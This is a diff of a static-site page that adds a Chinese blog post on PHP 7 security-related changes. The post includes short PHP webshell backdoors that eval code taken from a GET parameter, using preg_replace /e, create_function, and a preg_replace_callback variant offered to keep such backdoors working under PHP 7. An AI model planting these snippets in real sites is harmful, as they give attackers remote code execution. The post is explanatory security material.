@@ -75,7 +75,7 @@
 
 
 
-  <meta name="keywords" content="Hexo, NexT">
+  <meta name="keywords" content="php,">
 
 
 
@@ -88,16 +88,24 @@
 
 
 
-<meta name="description" content="安全小白,目前web、系统双管齐下，喜欢代码审计、python、pwn、渗透">
-<meta property="og:type" content="website">
-<meta property="og:title" content="Even-Want">
-<meta property="og:url" content="http://yoursite.com/tags/php-Directory-Traversal/index.html">
+<meta name="description" content="函数变动preg_replace函数的\e修饰符被移除123&amp;lt;?php    preg_replace(&amp;quot;/.*/e&amp;quot;,$_GET[&amp;apos;h&amp;apos;],&amp;quot;.&amp;quot;);?&amp;gt; php5可以使用上述代码构建后门但是到了php7，不再支持\e修饰符，取而代之的是preg_replace_callback()函数。实际上只需稍许改动，我们就能重新凭借">
+<meta name="keywords" content="php">
+<meta property="og:type" content="article">
+<meta property="og:title" content="php7部分安全改动">
+<meta property="og:url" content="http://yoursite.com/2019/05/22/php7部分安全改动/index.html">
 <meta property="og:site_name" content="Even-Want">
-<meta property="og:description" content="安全小白,目前web、系统双管齐下，喜欢代码审计、python、pwn、渗透">
+<meta property="og:description" content="函数变动preg_replace函数的\e修饰符被移除123&amp;lt;?php    preg_replace(&amp;quot;/.*/e&amp;quot;,$_GET[&amp;apos;h&amp;apos;],&amp;quot;.&amp;quot;);?&amp;gt; php5可以使用上述代码构建后门但是到了php7，不再支持\e修饰符，取而代之的是preg_replace_callback()函数。实际上只需稍许改动，我们就能重新凭借">
 <meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://yoursite.com/2019/05/22/php7部分安全改动/1.PNG">
+<meta property="og:image" content="http://yoursite.com/2019/05/22/php7部分安全改动/2.PNG">
+<meta property="og:image" content="http://yoursite.com/2019/05/22/php7部分安全改动/3.PNG">
+<meta property="og:image" content="http://yoursite.com/2019/05/22/php7部分安全改动/4.PNG">
+<meta property="og:image" content="http://yoursite.com/2019/05/22/php7部分安全改动/5.PNG">
+<meta property="og:updated_time" content="2019-05-22T13:55:56.558Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Even-Want">
-<meta name="twitter:description" content="安全小白,目前web、系统双管齐下，喜欢代码审计、python、pwn、渗透">
+<meta name="twitter:title" content="php7部分安全改动">
+<meta name="twitter:description" content="函数变动preg_replace函数的\e修饰符被移除123&amp;lt;?php    preg_replace(&amp;quot;/.*/e&amp;quot;,$_GET[&amp;apos;h&amp;apos;],&amp;quot;.&amp;quot;);?&amp;gt; php5可以使用上述代码构建后门但是到了php7，不再支持\e修饰符，取而代之的是preg_replace_callback()函数。实际上只需稍许改动，我们就能重新凭借">
+<meta name="twitter:image" content="http://yoursite.com/2019/05/22/php7部分安全改动/1.PNG">
 
 
 
@@ -127,13 +135,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/tags/php-Directory-Traversal/">
+  <link rel="canonical" href="http://yoursite.com/2019/05/22/php7部分安全改动/">
 
 
 
 
 
-  <title>标签: php,Directory Traversal | Even-Want</title>
+  <title>php7部分安全改动 | Even-Want</title>
   
 
 
@@ -154,7 +162,7 @@
     
   
 
-  <div class="container sidebar-position-left ">
+  <div class="container sidebar-position-left page-post-detail">
     <div class="headband"></div>
     <a href="https://github.com/SticKManII" class="github-corner" aria-label="View source on Github"><svg width="80" height="80" viewbox="0 0 250 250" style="fill:#151513; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"/><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"/><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"/></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
     <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
@@ -290,52 +298,201 @@
           <div id="content" class="content">
             
 
-  
-  
-  
-  <div class="post-block tag">
+  <div id="posts" class="posts-expand">
+    
 
-    <div id="posts" class="posts-collapse">
-      <div class="collection-title">
-        <h1>php,Directory Traversal<small>标签</small>
-        </h1>
-      </div>
+  
 
-      
-        
+  
+  
+  
 
   <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/05/22/php7部分安全改动/">
 
-      <h2 class="post-title">
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Even-Want">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/image/lf.jpeg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Even-Want">
+    </span>
+
+    
+      <header class="post-header">
+
         
-            <a class="post-title-link" href="/2019/04/29/Joomla-Core-1-5-0-3-9-4-Directory-Traversal-Authenticated-Arbitrary-File-Deletion分析/" itemprop="url">
-              
-                <span itemprop="name">Joomla Core 1.5.0 - 3.9.4 - Directory Traversal / Authenticated Arbitrary File Deletion分析</span>
-              
-            </a>
         
-      </h2>
+          <h1 class="post-title" itemprop="name headline">php7部分安全改动</h1>
+        
 
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2019-04-29T13:39:13+08:00" content="2019-04-29">
-          04-29
-        </time>
-      </div>
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-05-22T21:52:22+08:00">
+                2019-05-22
+              </time>
+            
 
-    </header>
-  </article>
+            
 
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  533
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  2
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="函数变动"><a href="#函数变动" class="headerlink" title="函数变动"></a>函数变动</h2><h3 id="preg-replace函数的-e修饰符被移除"><a href="#preg-replace函数的-e修饰符被移除" class="headerlink" title="preg_replace函数的\e修饰符被移除"></a>preg_replace函数的\e修饰符被移除</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    preg_replace(&quot;/.*/e&quot;,$_GET[&apos;h&apos;],&quot;.&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>php5可以使用上述代码构建后门<br>但是到了php7，不再支持\e修饰符，取而代之的是<code>preg_replace_callback()</code>函数。<br><img src="/2019/05/22/php7部分安全改动/1.PNG" alt="1"><br>实际上只需稍许改动，我们就能重新凭借该函数构建我们的后门。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> preg_replace_callback(&quot;/.*/&quot;,function ($a)&#123;@eval($a[0]);&#125;,$_GET[&quot;h&quot;]);</span><br><span class="line"> ?&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/05/22/php7部分安全改动/2.PNG" alt="2"></p>
+<h3 id="create-function函数被废弃"><a href="#create-function函数被废弃" class="headerlink" title="create_function函数被废弃"></a>create_function函数被废弃</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a=create_function(&quot;&quot;,$_GET[&apos;h&apos;]);</span><br><span class="line">$a();</span><br></pre></td></tr></table></figure>
+<p>在php7.2版本，使用上述代码会产生警告，但是依旧能够执行；在此之前的版本，则不会产生任何警告。<br><img src="/2019/05/22/php7部分安全改动/3.PNG" alt="3"></p>
+<h3 id="mysql-系列移除"><a href="#mysql-系列移除" class="headerlink" title="mysql_*系列移除"></a>mysql_*系列移除</h3><p>php7已经不再能够使用mysql_*系列函数，推荐使用mysqli或者pdo_mysql。<br><img src="/2019/05/22/php7部分安全改动/4.PNG" alt="4"></p>
+<h3 id="unserialize增加可选白名单参数"><a href="#unserialize增加可选白名单参数" class="headerlink" title="unserialize增加可选白名单参数"></a>unserialize增加可选白名单参数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$data = unserialize($serializedObj1 , [&quot;allowed_classes&quot; =&gt; true]);</span><br><span class="line">$data2 = unserialize($serializedObj2 , [&quot;allowed_classes&quot; =&gt; [&quot;MyClass1&quot;, &quot;MyClass2&quot;]]);</span><br></pre></td></tr></table></figure>
+<p>如果反序列化之后的类名不在指定的白名单中，那么就会产生错误。<br>而如果将其参数设置为<code>true</code>，也就是无限制。如果设置为<code>false</code>，那么所有的对象都会转换为<code>__PHP_Incomplete_Class</code></p>
+<h3 id="assert-7-2版本以上不再能够执行代码"><a href="#assert-7-2版本以上不再能够执行代码" class="headerlink" title="assert 7.2版本以上不再能够执行代码"></a>assert 7.2版本以上不再能够执行代码</h3><p>可以使用eval进行代替，但是使用assert执行代码的后门基本都不能用了，包括熟悉的菜刀。</p>
+<h2 id="其他改动"><a href="#其他改动" class="headerlink" title="其他改动"></a>其他改动</h2><h3 id="十六进制字符串不再被认为是数字"><a href="#十六进制字符串不再被认为是数字" class="headerlink" title="十六进制字符串不再被认为是数字"></a>十六进制字符串不再被认为是数字</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">var_dump(&quot;0x123&quot; == &quot;291&quot;);</span><br><span class="line">var_dump(is_numeric(&quot;0x123&quot;));</span><br><span class="line">var_dump(&quot;0xe&quot; + &quot;0x1&quot;);</span><br><span class="line">var_dump(substr(&quot;foo&quot;, &quot;0x1&quot;));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/05/22/php7部分安全改动/5.PNG" alt="5"></p>
+<h3 id="ASP、script-PHP标签被移除"><a href="#ASP、script-PHP标签被移除" class="headerlink" title="ASP、script PHP标签被移除"></a>ASP、script PHP标签被移除</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;%   %&gt;</span><br><span class="line">&lt;%=  %&gt;</span><br><span class="line">&lt;script language=&quot;php&quot;&gt;     &lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>上述标签都已经被干掉了，也就是说只有&lt;?php?&gt;这样的才能在php7上运行。</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>基本上很多能够利用的东西以及CTF里面的小套路都随着php7的更新而不能用了，个人认为影响挺大的莫过于assert不能用了，意味着很多马都得回炉重造；而mysql_*家族的移除，也意味着预编译的普及，可能sql注入的洞会越来越难找。但是php7也有一些新的东西，说不定能重新为之利用，只是现在还没有发掘出来。</p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.freebuf.com/articles/web/197013.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/197013.html</a></p>
 
       
     </div>
+    
+    
+    
 
+    
+	
+    <div>
+  
+    
+<div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+
+  
+    </div>
+	
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/php/" rel="tag"><i class="fa fa-tag"></i> php</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/05/15/使用samba绕过allow-url-include限制/" rel="next" title="使用samba绕过allow_url_include限制">
+                <i class="fa fa-chevron-left"></i> 使用samba绕过allow_url_include限制
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
   </div>
   
   
   
+  </article>
 
-  
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
 
 
           </div>
@@ -343,6 +500,15 @@
 
 
           
+
+  
+    <div class="comments" id="comments">
+      <div id="lv-container" data-id="city" data-uid="MTAyMC8zMzM3Mi85OTI4"></div>
+    </div>
+
+  
+
+
 
         </div>
         
@@ -363,8 +529,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -433,6 +608,22 @@
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#函数变动"><span class="nav-number">1.</span> <span class="nav-text">函数变动</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#preg-replace函数的-e修饰符被移除"><span class="nav-number">1.1.</span> <span class="nav-text">preg_replace函数的\e修饰符被移除</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#create-function函数被废弃"><span class="nav-number">1.2.</span> <span class="nav-text">create_function函数被废弃</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#mysql-系列移除"><span class="nav-number">1.3.</span> <span class="nav-text">mysql_*系列移除</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#unserialize增加可选白名单参数"><span class="nav-number">1.4.</span> <span class="nav-text">unserialize增加可选白名单参数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#assert-7-2版本以上不再能够执行代码"><span class="nav-number">1.5.</span> <span class="nav-text">assert 7.2版本以上不再能够执行代码</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#其他改动"><span class="nav-number">2.</span> <span class="nav-text">其他改动</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#十六进制字符串不再被认为是数字"><span class="nav-number">2.1.</span> <span class="nav-text">十六进制字符串不再被认为是数字</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ASP、script-PHP标签被移除"><span class="nav-number">2.2.</span> <span class="nav-text">ASP、script PHP标签被移除</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#总结"><span class="nav-number">3.</span> <span class="nav-text">总结</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考链接"><span class="nav-number">4.</span> <span class="nav-text">参考链接</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
@@ -586,6 +777,10 @@
 
 
   
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
 
   
 
@@ -614,6 +809,17 @@
 
 
 
+  
+    <script type="text/javascript">
+      (function(d, s) {
+        var j, e = d.getElementsByTagName(s)[0];
+        if (typeof LivereTower === 'function') { return; }
+        j = d.createElement(s);
+        j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+        j.async = true;
+        e.parentNode.insertBefore(j, e);
+      })(document, 'script');
+    </script>
   
 
 
